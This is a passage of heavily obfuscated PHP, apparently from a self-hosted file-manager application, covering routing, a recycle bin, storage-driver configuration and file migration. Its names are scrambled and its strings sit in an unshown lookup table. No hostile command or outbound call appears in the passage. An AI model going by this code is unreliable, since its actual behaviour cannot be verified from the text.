!1; } if (_get($GLOBALS, $µÈÎ£¼ó[548])) { return !0; } $ô¨ä½Êõ = $this->getConfig(); if (!$ô¨ä½Êõ[$•”øÕµî]) { return !1; } return ActionCall($µÈÎ£¼ó[1616], $ô¨ä½Êõ[$•”øÕµî]); } public function url($ ñÅı³š, $˜ì±úğ€ = '', $³¿áÀ¯¾ = true) { $°‘‰«¯° =& $_SERVER[ •ŒÓîÆ]; $îİû‹İ¼ = $this->getConfig(); $œÈâÁã = KOD_VERSION . $°‘‰«¯°[10] . KOD_VERSION_BUILD; $Óş›©ÜÂ = $this->packageVersion(); $è¹çË¬‹ = $œÈâÁã . $°‘‰«¯°[440] . $Óş›©ÜÂ; if (substr($ ñÅı³š, 0, 4) == $°‘‰«¯°[151] || substr($ ñÅı³š, 0, 2) == $°‘‰«¯°[1395]) { $†Ô¨îÃ• = $ ñÅı³š . $°‘‰«¯°[1617] . $è¹çË¬‹; } else { if ($˜ì±úğ€ == $°‘‰«¯°[12]) { $†Ô¨îÃ• = $this->pluginHost . $ ñÅı³š . $°‘‰«¯°[1617] . $è¹çË¬‹; } else { if ($˜ì±úğ€ === $°‘‰«¯°[77]) { $†Ô¨îÃ• = $this->pluginHost . $ ñÅı³š; } else { if ($˜ì±úğ€ == $°‘‰«¯°[1618]) { $†Ô¨îÃ• = STATIC_PATH . $ ñÅı³š . $°‘‰«¯°[1617] . $œÈâÁã; } else { if ($˜ì±úğ€ == $°‘‰«¯°[1619]) { $†Ô¨îÃ• = APP_HOST . $°‘‰«¯°[1620] . $ ñÅı³š . $°‘‰«¯°[1617] . $œÈâÁã; } else { if (isset($îİû‹İ¼[$˜ì±úğ€])) { $†Ô¨îÃ• = $îİû‹İ¼[$˜ì±úğ€] . $ ñÅı³š . $°‘‰«¯°[1617] . $è¹çË¬‹; } } } } } } if (!$³¿áÀ¯¾) { return $†Ô¨îÃ•; } echo $†Ô¨îÃ•; } public function link($ª†øÅÉ« = false, $ü«÷˜Ô‰ = '') { $õá”àô— =& $_SERVER[ •ŒÓîÆ]; if (!$ª†øÅÉ«) { $this->link($õá”àô—[1621], $õá”àô—[1619]); $this->link($õá”àô—[1622], $õá”àô—[1618]); $this->link($õá”àô—[1623], $õá”àô—[1618]); $this->link($õá”àô—[1624], $õá”àô—[1618]); $this->link($õá”àô—[1625], $õá”àô—[1618]); return; } $Ë æØõä = $this->url($ª†øÅÉ«, $ü«÷˜Ô‰, !1); if (substr($ª†øÅÉ«, -3) == $õá”àô—[1626]) { echo $õá”àô—[1627] . $Ë æØõä . $õá”àô—[1628] . $õá”àô—[248]; } else { if (substr($ª†øÅÉ«, -4) == $õá”àô—[1629]) { echo $õá”àô—[1630] . $Ë æØõä . $õá”àô—[1631] . $õá”àô—[248]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\x5b\136\57\135\53", "\72\156\165\155" => "\x5b\60\x2d\x39\135\53", "\x3a\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ıâ›†ÑÙ, $­ÇëÅáĞ) { $È×¼ÂÈÄ =& $_SERVER[ •ŒÓîÆ]; if ($ıâ›†ÑÙ == $È×¼ÂÈÄ[1632]) { $¢Ÿ¢…¨ = array_map($È×¼ÂÈÄ[1633], $­ÇëÅáĞ[0]); $ñØğ‰¼å = strpos($­ÇëÅáĞ[1], $È×¼ÂÈÄ[8]) === 0 ? $­ÇëÅáĞ[1] : $È×¼ÂÈÄ[8] . $­ÇëÅáĞ[1]; $ÚñßôÃë = $­ÇëÅáĞ[2]; } else { $¢Ÿ¢…¨ = null; $ñØğ‰¼å = strpos($­ÇëÅáĞ[0], $È×¼ÂÈÄ[8]) === 0 ? $­ÇëÅáĞ[0] : $È×¼ÂÈÄ[8] . $­ÇëÅáĞ[0]; $ÚñßôÃë = $­ÇëÅáĞ[1]; } array_push(self::$maps, $¢Ÿ¢…¨); array_push(self::$routes, $ñØğ‰¼å); array_push(self::$methods, strtoupper($ıâ›†ÑÙ)); array_push(self::$callbacks, $ÚñßôÃë); } public static function error($éõ²¦ì) { self::$errorCallback = $éõ²¦ì; } public static function haltOnMatch($²ˆ˜ÃĞª = true) { self::$halts = $²ˆ˜ÃĞª; } public static function dispatch() { $ÑÙ¾ôà =& $_SERVER[ •ŒÓîÆ]; $ÊÓıÉÍô = parse_url($_SERVER[$ÑÙ¾ôà[1634]], PHP_URL_PATH); $ğ·Ú¢å = $_SERVER[$ÑÙ¾ôà[162]]; $ï¸ÂæÔª = array_keys(static::$patterns); $ğ×«î„¯ = array_values(static::$patterns); $¾ìš““õ = !1; self::$routes = preg_replace($ÑÙ¾ôà[1317], $ÑÙ¾ôà[8], self::$routes); if (in_array($ÊÓıÉÍô, self::$routes)) { $°Ç¿’Êù = array_keys(self::$routes, $ÊÓıÉÍô); foreach ($°Ç¿’Êù as $“®€Ñ”Ø) { if (self::$methods[$“®€Ñ”Ø] == $ğ·Ú¢å || self::$methods[$“®€Ñ”Ø] == $ÑÙ¾ôà[1635] || in_array($ğ·Ú¢å, self::$maps[$“®€Ñ”Ø])) { $¾ìš““õ = !0; if (!is_object(self::$callbacks[$“®€Ñ”Ø])) { $·Ì÷¸ = explode($ÑÙ¾ôà[8], self::$callbacks[$“®€Ñ”Ø]); $ã˜üÉÏ½ = end($·Ì÷¸); $„Ö¾Öã = explode($ÑÙ¾ôà[1249], $ã˜üÉÏ½); $Ú¿¾‹·“ = new $„Ö¾Öã[0](); $Ú¿¾‹·“->{$„Ö¾Öã[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$“®€Ñ”Ø]); if (self::$halts) { return; } } } } } else { $˜òö¤şµ = 0; foreach (self::$routes as $“®€Ñ”Ø) { if (strpos($“®€Ñ”Ø, $ÑÙ¾ôà[4]) !== !1) { $“®€Ñ”Ø = str_replace($ï¸ÂæÔª, $ğ×«î„¯, $“®€Ñ”Ø); } if (preg_match($ÑÙ¾ôà[1636] . $“®€Ñ”Ø . $ÑÙ¾ôà[1637], $ÊÓıÉÍô, $‡şäøÁã)) { if (self::$methods[$˜òö¤şµ] == $ğ·Ú¢å || self::$methods[$˜òö¤şµ] == $ÑÙ¾ôà[1635] || !empty(self::$maps[$˜òö¤şµ]) && in_array($ğ·Ú¢å, self::$maps[$˜òö¤şµ])) { $¾ìš““õ = !0; array_shift($‡şäøÁã); if (!is_object(self::$callbacks[$˜òö¤şµ])) { $·Ì÷¸ = explode($ÑÙ¾ôà[8], self::$callbacks[$˜òö¤şµ]); $ã˜üÉÏ½ = end($·Ì÷¸); $„Ö¾Öã = explode($ÑÙ¾ôà[1249], $ã˜üÉÏ½); $Ú¿¾‹·“ = new $„Ö¾Öã[0](); if (!method_exists($Ú¿¾‹·“, $„Ö¾Öã[1])) { echo $ÑÙ¾ôà[1638]; } else { call_user_func_array(array($Ú¿¾‹·“, $„Ö¾Öã[1]), $‡şäøÁã); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$˜òö¤şµ], $‡şäøÁã); if (self::$halts) { return; } } } } $˜òö¤şµ++; } } if ($¾ìš““õ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $èéôï£ =& $_SERVER[ •ŒÓîÆ]; header($_SERVER[$èéôï£[1639]] . $èéôï£[1640]); echo $èéôï£[1641]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÑÙ¾ôà[1634]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto AÕÔ†¬Ñß×; B­£–«Å‘Ù: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\143\x65\x5f\162\145\143\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\x54\151\x6d\145", "\164\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\x66\165\156\143\x74\x69\157\156")); public function listData($çÎ•“ƒœ = false) { $İŸŠƒÉè =& $_SERVER[ •ŒÓîÆ]; $çÎ•“ƒœ = $çÎ•“ƒœ ? $çÎ•“ƒœ : USER_ID; $ó…êÒÚ = $this->where(array($İŸŠƒÉè[1681] => $çÎ•“ƒœ))->select(); return array_to_keyvalue($ó…êÒÚ, $İŸŠƒÉè[12], $İŸŠƒÉè[183]); } public function moveToRecycle($“®ÛÇàŸ) { $ÊÍ£ô­ô =& $_SERVER[ •ŒÓîÆ]; $İ°Ìå¸Ì = Model($ÊÍ£ô­ô[1374]); $”Šê»½Â = $İ°Ìå¸Ì->sourceInfo($“®ÛÇàŸ); if (!$”Šê»½Â || $”Šê»½Â[$ÊÍ£ô­ô[484]] == $ÊÍ£ô­ô[90]) { return; } $Âù‹Æ©í = array($ÊÍ£ô­ô[470] => $“®ÛÇàŸ, $ÊÍ£ô­ô[1681] => USER_ID, $ÊÍ£ô­ô[628] => $”Šê»½Â[$ÊÍ£ô­ô[180]], $ÊÍ£ô­ô[629] => $”Šê»½Â[$ÊÍ£ô­ô[550]], $ÊÍ£ô­ô[632] => $”Šê»½Â[$ÊÍ£ô­ô[565]]); $this->add($Âù‹Æ©í); $this->recycleMove($“®ÛÇàŸ, 1); if ($”Šê»½Â[$ÊÍ£ô­ô[464]] == $ÊÍ£ô­ô[90]) { $‡ƒ­èÂ = array($ÊÍ£ô­ô[632] => array($ÊÍ£ô­ô[592], $”Šê»½Â[$ÊÍ£ô­ô[565]] . $“®ÛÇàŸ . $ÊÍ£ô­ô[593])); $İ°Ìå¸Ì->where($‡ƒ­èÂ)->setField($ÊÍ£ô­ô[484], 1); } } public function clear() { $this->remove(!1); } public function remove($È°öÇˆÁ = false, $ƒŠÙä®­ = false) { $—ŒÀº‚ =& $_SERVER[ •ŒÓîÆ]; $ƒŠÙä®­ = $ƒŠÙä®­ ? $ƒŠÙä®­ : USER_ID; $ñÃ¦²ò = Model($—ŒÀº‚[1374]); $ÏŠ½Ÿ‘ = $this->listData($ƒŠÙä®­); $È°öÇˆÁ = $È°öÇˆÁ === !1 ? !1 : $È°öÇˆÁ; $ÀŞâÔ‡¼ = array(); foreach ($ÏŠ½Ÿ‘ as $à¾Å) { if ($È°öÇˆÁ != !1 && !in_array($à¾Å, $È°öÇˆÁ)) { continue; } $ı ‰°ŒÇ = $ñÃ¦²ò->sourceInfo($à¾Å); $ñÃ¦²ò->remove($à¾Å, !1); $¼îŒ’ò™ = $ı ‰°ŒÇ[$—ŒÀº‚[180]] . $—ŒÀº‚[11] . $ı ‰°ŒÇ[$—ŒÀº‚[550]]; $ÀŞâÔ‡¼[$¼îŒ’ò™] = array($—ŒÀº‚[628] => $ı ‰°ŒÇ[$—ŒÀº‚[180]], $—ŒÀº‚[550] => $ı ‰°ŒÇ[$—ŒÀº‚[550]]); $this->where(array($—ŒÀº‚[183] => $à¾Å))->delete(); } foreach ($ÀŞâÔ‡¼ as $’™›¨ğô) { $ñÃ¦²ò->targetSpaceUpdate($’™›¨ğô[$—ŒÀº‚[180]], $’™›¨ğô[$—ŒÀº‚[550]]); } } public function restore($úÀşóìœ = false) { $‹êúóå = $this->listData(); $this->_restoreSource($‹êúóå, $úÀşóìœ); } public function removeUserAll($îĞ“‘) { $this->remove(!1, $îĞ“‘); } public function restoreItem($úÆš€Í) { $this->_restoreSource(array($úÆš€Í), array($úÆš€Í)); } private function _restoreSource($ç¾ÕÒã¤, $–ãÅ¼Ê) { $ô®¤Şìç =& $_SERVER[ •ŒÓîÆ]; $œïûùñÀ = Model($ô®¤Şìç[1374]); $–ãÅ¼Ê = $–ãÅ¼Ê == !1 ? !1 : $–ãÅ¼Ê; if (!$ç¾ÕÒã¤) { return !0; } $¯¶½‘Æò = array(); foreach ($ç¾ÕÒã¤ as $¤›½«Ğö) { if ($–ãÅ¼Ê != !1 && !in_array($¤›½«Ğö, $–ãÅ¼Ê)) { continue; } $Ì”±ÉÛœ = $œïûùñÀ->sourceInfo($¤›½«Ğö); $’´Ûøè¯ = $œïûùñÀ->sourceInfo($Ì”±ÉÛœ[$ô®¤Şìç[182]]); if ($’´Ûøè¯[$ô®¤Şìç[484]] == $ô®¤Şìç[90]) { continue; } $œïûùñÀ->lockMoveStart($¤›½«Ğö); $this->recycleMove($¤›½«Ğö, 0); if ($Ì”±ÉÛœ[$ô®¤Şìç[464]] == $ô®¤Şìç[90]) { $Šªİ”œí = array($ô®¤Şìç[632] => array($ô®¤Şìç[592], $Ì”±ÉÛœ[$ô®¤Şìç[565]] . $¤›½«Ğö . $ô®¤Şìç[593])); $œïûùñÀ->where($Šªİ”œí)->setField($ô®¤Şìç[484], 0); $this->restoreFolderChildren($¤›½«Ğö, $ç¾ÕÒã¤); } $this->where(array($ô®¤Şìç[183] => $¤›½«Ğö))->delete(); $œïûùñÀ->folderSizeReset($Ì”±ÉÛœ[$ô®¤Şìç[182]]); $¯¶½‘Æò[] = $Ì”±ÉÛœ[$ô®¤Şìç[182]]; if ($Ì”±ÉÛœ[$ô®¤Şìç[464]] == $ô®¤Şìç[90]) { $¯¶½‘Æò[] = $¤›½«Ğö; } $œïûùñÀ->lockMoveEnd($¤›½«Ğö); } $œïûùñÀ->updateModifyTime($¯¶½‘Æò); } private function restoreFolderChildren($„”ñëš·, $»àóáÆÛ) { $÷ù¬ Ú“ =& $_SERVER[ •ŒÓîÆ]; $Ô—ÕÛæ™ = Model($÷ù¬ Ú“[1374]); $í†¥Ú÷á = array($÷ù¬ Ú“[183] => array($÷ù¬ Ú“[7], array())); foreach ($»àóáÆÛ as $®ñä§) { if ($®ñä§ == $„”ñëš·) { continue; } if (!$Ô—ÕÛæ™->isParentOf($„”ñëš·, $®ñä§)) { continue; } $ñ§Õ˜Ì‹ = $Ô—ÕÛæ™->sourceInfo($®ñä§); if ($ñ§Õ˜Ì‹[$÷ù¬ Ú“[464]] == $÷ù¬ Ú“[90]) { $í†¥Ú÷á[] = array($÷ù¬ Ú“[632] => array($÷ù¬ Ú“[592], $ñ§Õ˜Ì‹[$÷ù¬ Ú“[565]] . $®ñä§ . $÷ù¬ Ú“[593])); } else { $í†¥Ú÷á[$÷ù¬ Ú“[183]][1][] = $®ñä§; } } if (!$í†¥Ú÷á[$÷ù¬ Ú“[183]][1]) { unset($í†¥Ú÷á[$÷ù¬ Ú“[183]]); } if (!$í†¥Ú÷á) { return; } if (is_array($í†¥Ú÷á[$÷ù¬ Ú“[183]]) && is_array($í†¥Ú÷á[$÷ù¬ Ú“[183]][1])) { $í†¥Ú÷á[$÷ù¬ Ú“[183]][1] = array_unique($í†¥Ú÷á[$÷ù¬ Ú“[183]][1]); } $í†¥Ú÷á[$÷ù¬ Ú“[1041]] = $÷ù¬ Ú“[1986]; $Ô—ÕÛæ™->where($í†¥Ú÷á)->setField($÷ù¬ Ú“[484], 1); } private function recycleMove($Œïµ†İ•, $ıÚÇšì’ = 1) { $«‰£‹‘§ =& $_SERVER[ •ŒÓîÆ]; $¾¶èñ­ = Model($«‰£‹‘§[1374]); $Ñ·‚²£Í = Model($«‰£‹‘§[2205]); $±™¿ÈúŸ = array($«‰£‹‘§[183] => $Œïµ†İ•); if ($ıÚÇšì’) { $¾¶èñ­->where($±™¿ÈúŸ)->setField($«‰£‹‘§[484], 1); $Ñ·‚²£Í->eventRecycle($Œïµ†İ•, $«‰£‹‘§[2206]); } else { $ãßåë²ê = $¾¶èñ­->where($±™¿ÈúŸ)->find(); $…µŠêì¥ = $ãßåë²ê[$«‰£‹‘§[464]] == $«‰£‹‘§[90]; $’ôïıı³ = $¾¶èñ­->fileNameAuto($ãßåë²ê[$«‰£‹‘§[182]], $ãßåë²ê[$«‰£‹‘§[32]], REPEAT_RENAME_FOLDER, $…µŠêì¥); if ($’ôïıı³ != $ãßåë²ê[$«‰£‹‘§[32]]) { $¾¶èñ­->rename($Œïµ†İ•, $’ôïıı³); } $¾¶èñ­->where($±™¿ÈúŸ)->setField($«‰£‹‘§[484], 0); $Ñ·‚²£Í->eventRecycle($Œïµ†İ•, $«‰£‹‘§[2207]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\163\157\x75\x72\x63\145\x53\145\143\162\x65\164\114\151\163\x74"; public $field = array("\x73\157\165\x72\x63\145\x49\x44", "\x74\x79\x70\x65\x49\x44", "\143\x72\145\x61\x74\x65\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x73\164\157\162\141\x67\x65\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\x69\172\x65\x4d\x61\170", "\163\171\x73\164\x65\155", "\144\145\x66\141\165\x6c\164", "\144\x72\x69\166\x65\x72", "\x63\157\156\x66\x69\147"); public function listData($÷ŒÉéÄÚ = false, $óÚå¯Î‡ = "\x6d\x6f\144\x69\x66\171\x54\151\x6d\145", $İÈ½Ï¼Ò = false) { $„¼²¸¹» =& $_SERVER[ •ŒÓîÆ]; $¸½”Òï = parent::listData($÷ŒÉéÄÚ, $óÚå¯Î‡, $İÈ½Ï¼Ò); if ($÷ŒÉéÄÚ) { return $¸½”Òï; } $±÷æ™şÂ = $this->ioSizeUseGet(array_to_keyvalue($¸½”Òï, $„¼²¸¹»[12], $„¼²¸¹»[453])); foreach ($¸½”Òï as $µÀ„Ÿ¯ => $ÁöÄÓÛ) { unset($¸½”Òï[$µÀ„Ÿ¯][$„¼²¸¹»[6]]); $¸½”Òï[$µÀ„Ÿ¯][$„¼²¸¹»[1877]] = isset($±÷æ™şÂ[$ÁöÄÓÛ[$„¼²¸¹»[453]]]) ? $±÷æ™şÂ[$ÁöÄÓÛ[$„¼²¸¹»[453]]] : 0; } return $¸½”Òï; } public function ioSizeUseGet($ááÍ™•) { $Ï´«Ô÷ =& $_SERVER[ •ŒÓîÆ]; if (!$ááÍ™•) { return array(); } $³Ä¥¥õÕ = $Ï´«Ô÷[2208] . implode($Ï´«Ô÷[50], $ááÍ™•); $ÖìçÃå = Cache::get($³Ä¥¥õÕ); if ($ÖìçÃå) { return $ÖìçÃå; } $Ä•éÄÌ© = array($Ï´«Ô÷[858] => $Ï´«Ô÷[453], $Ï´«Ô÷[2209] => $Ï´«Ô÷[78]); $ƒÉ›—Ù¸ = array($Ï´«Ô÷[858] => array($Ï´«Ô÷[7], $ááÍ™•)); $ÖìçÃå = Model($Ï´«Ô÷[830])->field($Ä•éÄÌ©)->where($ƒÉ›—Ù¸)->group($Ï´«Ô÷[858])->select(); $ÖìçÃå = array_to_keyvalue($ÖìçÃå, $Ï´«Ô÷[453], $Ï´«Ô÷[78]); Cache::set($³Ä¥¥õÕ, $ÖìçÃå, 600); return $ÖìçÃå; } public function getConfig($ªşæ¹×ë) { $‘°¹œ®Û = parent::listData($ªşæ¹×ë); return json_decode($‘°¹œ®Û[$_SERVER[ •ŒÓîÆ][6]], !0); } public function update($€ì¤Èº³, $Í‘ãÜØ‹) { $›ãÉ•¼¨ =& $_SERVER[ •ŒÓîÆ]; $§’ÜŒÓÊ = $Í‘ãÜØ‹[$›ãÉ•¼¨[32]]; $ƒ¯ı»­Ÿ = array_to_keyvalue(parent::listData(), $›ãÉ•¼¨[32]); if (isset($ƒ¯ı»­Ÿ[$§’ÜŒÓÊ]) && $ƒ¯ı»­Ÿ[$§’ÜŒÓÊ][$›ãÉ•¼¨[453]] != $€ì¤Èº³) { return !1; } $this->checkPwd($€ì¤Èº³, $Í‘ãÜØ‹); if (isset($Í‘ãÜØ‹[$›ãÉ•¼¨[2210]]) && $Í‘ãÜØ‹[$›ãÉ•¼¨[2210]] == $›ãÉ•¼¨[90]) { $this->checkConfig($Í‘ãÜØ‹); } unset($Í‘ãÜØ‹[$›ãÉ•¼¨[2210]]); $—”–æÃ¹ = parent::update($€ì¤Èº³, $Í‘ãÜØ‹); if ($—”–æÃ¹ && $Í‘ãÜØ‹[$›ãÉ•¼¨[37]]) { $€‹’åÃ = 0; foreach ($ƒ¯ı»­Ÿ as $óœÈ§ä­) { if ($óœÈ§ä­[$›ãÉ•¼¨[37]] && $óœÈ§ä­[$›ãÉ•¼¨[453]] != $€ì¤Èº³) { $€‹’åÃ = $óœÈ§ä­[$›ãÉ•¼¨[453]]; parent::update($óœÈ§ä­[$›ãÉ•¼¨[453]], array($›ãÉ•¼¨[37] => 0)); } } $this->updateBackup($€ì¤Èº³, $€‹’åÃ); } return $—”–æÃ¹; } public function add($˜›‘¦•à) { $‘«ùª– =& $_SERVER[ •ŒÓîÆ]; $õô³ÀÑ· = array_to_keyvalue(parent::listData(), $‘«ùª–[32]); if (isset($õô³ÀÑ·[$˜›‘¦•à[$‘«ùª–[32]]])) { return !1; } $this->checkConfig($˜›‘¦•à); $¢Ó•æÑ¬ = parent::insert($˜›‘¦•à); if ($¢Ó•æÑ¬ && $˜›‘¦•à[$‘«ùª–[37]]) { foreach ($õô³ÀÑ· as $»²­Öáê) { if ($»²­Öáê[$‘«ùª–[37]]) { parent::update($»²­Öáê[$‘«ùª–[453]], array($‘«ùª–[37] => 0)); } } } return $¢Ó•æÑ¬; } public function updateBackup($¼‰¿ÑÇş, $æ—÷‰½) { $Ğó‡¾‹ =& $_SERVER[ •ŒÓîÆ]; if (!$æ—÷‰½) { return; } $Á¢Ñ™ŠÒ = Model($Ğó‡¾‹[790])->config(); if ($Á¢Ñ™ŠÒ[$Ğó‡¾‹[1660]] != $Ğó‡¾‹[90] || $Á¢Ñ™ŠÒ[$Ğó‡¾‹[792]] != $æ—÷‰½) { return; } $ÍøË¶î— = Model($Ğó‡¾‹[811])->get($Ğó‡¾‹[821]); $ÍøË¶î— = json_decode($ÍøË¶î—, !0); if (!$ÍøË¶î—) { return; } $ÍøË¶î—[$Ğó‡¾‹[792]] = $¼‰¿ÑÇş; Model($Ğó‡¾‹[811])->set(array($Ğó‡¾‹[821] => $ÍøË¶î—)); } public function checkPwd($ö˜—ÊË©, &$û††º‹€) { $èØŞ¨ =& $_SERVER[ •ŒÓîÆ]; if (empty($û††º‹€[$èØŞ¨[6]])) { return; } $šÃ÷è¦ã = json_decode($û††º‹€[$èØŞ¨[6]], !0); $’ç¬’í = $èØŞ¨[12]; $Õ¹ÎïãÕ = array($èØŞ¨[2211], $èØŞ¨[2212], $èØŞ¨[930]); foreach ($Õ¹ÎïãÕ as $Ò¯¢Êı) { if (isset($šÃ÷è¦ã[$Ò¯¢Êı])) { $’ç¬’í = $Ò¯¢Êı; break; } } if (!$’ç¬’í) { return; } $×„ş€¸³ = $this->getConfig($ö˜—ÊË©); $˜å„»™ = $×„ş€¸³[$’ç¬’í]; $ù»‰àÇÔ = $šÃ÷è¦ã[$’ç¬’í]; if ($ù»‰àÇÔ == str_repeat($èØŞ¨[205], strlen($˜å„»™))) { $šÃ÷è¦ã[$’ç¬’í] = $˜å„»™; $û††º‹€[$èØŞ¨[6]] = json_encode($šÃ÷è¦ã); } else { if ($ù»‰àÇÔ != $˜å„»™) { $û††º‹€[$èØŞ¨[2210]] = $èØŞ¨[90]; } } } public function checkConfig(&$Ç¾‘‘ºÌ, $›¬ Ÿ‘° = false) { $ü¾ØŞÛÊ =& $_SERVER[ •ŒÓîÆ]; $”ÃÎí = strtolower($Ç¾‘‘ºÌ[$ü¾ØŞÛÊ[97]]); $‰Ÿ÷ÛÕ‚ = json_decode($Ç¾‘‘ºÌ[$ü¾ØŞÛÊ[6]], !0); foreach ($‰Ÿ÷ÛÕ‚ as $½‚“·ñ§ => $Ÿ‡²ø) { if (is_string($Ÿ‡²ø)) { $‰Ÿ÷ÛÕ‚[$½‚“·ñ§] = trim($Ÿ‡²ø); } } $‰Ÿ÷ÛÕ‚[$ü¾ØŞÛÊ[2213]] = rand_string(6); $†‡¸’ÍË = $GLOBALS[$ü¾ØŞÛÊ[6]][$ü¾ØŞÛÊ[91]][$ü¾ØŞÛÊ[867]]; $Šêº×ê = isset($†‡¸’ÍË[$”ÃÎí]) ? $†‡¸’ÍË[$”ÃÎí] : ucfirst($”ÃÎí); $¼µîÇ¤ = $ü¾ØŞÛÊ[76] . $Šêº×ê; if (!$Šêº×ê || !class_exists($¼µîÇ¤)) { if ($›¬ Ÿ‘°) { return LNG($ü¾ØŞÛÊ[2214]); } write_log(array($ü¾ØŞÛÊ[2215], $Ç¾‘‘ºÌ, get_caller_info()), $ü¾ØŞÛÊ[2216]); show_json(LNG($ü¾ØŞÛÊ[2214]), !1, $Ç¾‘‘ºÌ); } $Ğ˜Ëı™Ş = new $¼µîÇ¤($‰Ÿ÷ÛÕ‚); if (in_array($”ÃÎí, $Ğ˜Ëı™Ş->objectDriver)) { if (!$Ğ˜Ëı™Ş->isBucketCors() && !$Ğ˜Ëı™Ş->setBucketCors()) { $†ŞÆ¤Â³ = LNG($ü¾ØŞÛÊ[2217]); $†ŞÆ¤Â³ .= $ü¾ØŞÛÊ[2218] . LNG($ü¾ØŞÛÊ[2219]); if ($›¬ Ÿ‘°) { return $†ŞÆ¤Â³; } show_json($†ŞÆ¤Â³, !1); } } $„«÷Ÿ¤á = rtrim($‰Ÿ÷ÛÕ‚[$ü¾ØŞÛÊ[1221]], $ü¾ØŞÛÊ[8]) . $ü¾ØŞÛÊ[8]; $½ûµè¥ = $Ğ˜Ëı™Ş->getPath($„«÷Ÿ¤á . $ü¾ØŞÛÊ[1225]); if (!$Ğ˜Ëı™Ş->mkfile($½ûµè¥)) { if ($›¬ Ÿ‘°) { return LNG($ü¾ØŞÛÊ[2217]); } show_json(LNG($ü¾ØŞÛÊ[2217]), !1); } $‰Ÿ÷ÛÕ‚[$ü¾ØŞÛÊ[1221]] = $„«÷Ÿ¤á; $Ç¾‘‘ºÌ[$ü¾ØŞÛÊ[6]] = json_encode($‰Ÿ÷ÛÕ‚); $Ç¾‘‘ºÌ[$ü¾ØŞÛÊ[97]] = $Šêº×ê; return !0; } public function driverListSystem() { $Íğ±Ñç‚ =& $_SERVER[ •ŒÓîÆ]; $•–Ö—Ÿ™ = parent::listData(); $Ÿ›Ú¦£ = array(); foreach ($•–Ö—Ÿ™ as $¬ÑÓšôû) { unset($¬ÑÓšôû[$Íğ±Ñç‚[217]], $¬ÑÓšôû[$Íğ±Ñç‚[87]]); $¬ÑÓšôû[$Íğ±Ñç‚[6]] = json_decode($¬ÑÓšôû[$Íğ±Ñç‚[6]], !0); $Ÿ›Ú¦£[] = $¬ÑÓšôû; } return $Ÿ›Ú¦£; } public function defaultDriver() { $îïÇÚÆ =& $_SERVER[ •ŒÓîÆ]; $‘—­›¡» = parent::listData(); $ã¤™›ë = array_filter_by_field($‘—­›¡», $îïÇÚÆ[37], 1); $ã¤™›ë = $ã¤™›ë[0]; if ($ã¤™›ë) { $ã¤™›ë[$îïÇÚÆ[6]] = json_decode($ã¤™›ë[$îïÇÚÆ[6]], !0); } return $ã¤™›ë; } public function driverInfo($Ú¸¨”ù®) { $ÄôÏëÏş =& $_SERVER[ •ŒÓîÆ]; $ªè©É‰â = array_to_keyvalue(parent::listData(), $ÄôÏëÏş[453]); if (!isset($ªè©É‰â[$Ú¸¨”ù®])) { return !1; } $»¢®êŸ³ = $ªè©É‰â[$Ú¸¨”ù®]; $»¢®êŸ³[$ÄôÏëÏş[6]] = json_decode($»¢®êŸ³[$ÄôÏëÏş[6]], !0); return $»¢®êŸ³; } public function remove($“çØ²Â§) { $this->removeShareItems($“çØ²Â§); return parent::remove($“çØ²Â§); } public function removeWithFile($¤šŒıàÙ, $ ‘¶åü¾) { $”¤‹âØü =& $_SERVER[ •ŒÓîÆ]; $Ï±†‰ª = array($”¤‹âØü[858] => $¤šŒıàÙ); $’±ûË£ = Model($”¤‹âØü[523])->where($Ï±†‰ª)->count(); $ı±ş´ÆÑ = Model($”¤‹âØü[523])->where($Ï±†‰ª)->sum($”¤‹âØü[78]); $ò„÷ºì = $ ‘¶åü¾ . $”¤‹âØü[2220] . $¤šŒıàÙ; $™Œ…Á¾» = LNG($ ‘¶åü¾ == $”¤‹âØü[600] ? $”¤‹âØü[2221] : $”¤‹âØü[2222]); $±ĞÉ–Ğà = new TaskFileTransfer($ò„÷ºì, $”¤‹âØü[2216], $’±ûË£, $™Œ…Á¾» . "\x28{$¤šŒıàÙ}\51"); $±ĞÉ–Ğà->task[$”¤‹âØü[804]] = (double) $ı±ş´ÆÑ; $ïİ·«ÕØ = KodIO::defaultDriver(); $ã¢ª¶¼â = $ïİ·«ÕØ[$”¤‹âØü[453]]; $¿ÖÛ—© = "\173\151\x6f\x3a{$ã¢ª¶¼â}\x7d\x2f"; $æí¤´Å‰ = !0; $œ¾‰‡ƒµ = array(); $ãš—ñ·© = Model($”¤‹âØü[216])->where($Ï±†‰ª)->field($”¤‹âØü[2223])->select(); foreach ($ãš—ñ·© as $—›¼¶Æ) { $š»ÇîíÎ = $—›¼¶Æ[$”¤‹âØü[86]]; $®ö¢ªš¡ = $¿ÖÛ—© . str_replace("\x7b\x69\157\72{$¤šŒıàÙ}\x7d\x2f", $”¤‹âØü[12], $š»ÇîíÎ); if (!IO::exist($š»ÇîíÎ)) { $œ¾‰‡ƒµ[] = $—›¼¶Æ[$”¤‹âØü[520]]; $±ĞÉ–Ğà->updateFileEnd($—›¼¶Æ[$”¤‹âØü[32]], $—›¼¶Æ[$”¤‹âØü[78]]); continue; } if (IO::exist($®ö¢ªš¡)) { $±ĞÉ–Ğà->updateFileEnd($—›¼¶Æ[$”¤‹âØü[32]], $—›¼¶Æ[$”¤‹âØü[78]]); continue; } if (!IO::move($š»ÇîíÎ, get_path_father($®ö¢ªš¡))) { $æí¤´Å‰ = !1; break; } $Ï±†‰ª = array($”¤‹âØü[520] => $—›¼¶Æ[$”¤‹âØü[520]]); $Ê’Ëüƒ = array($”¤‹âØü[858] => $ã¢ª¶¼â, 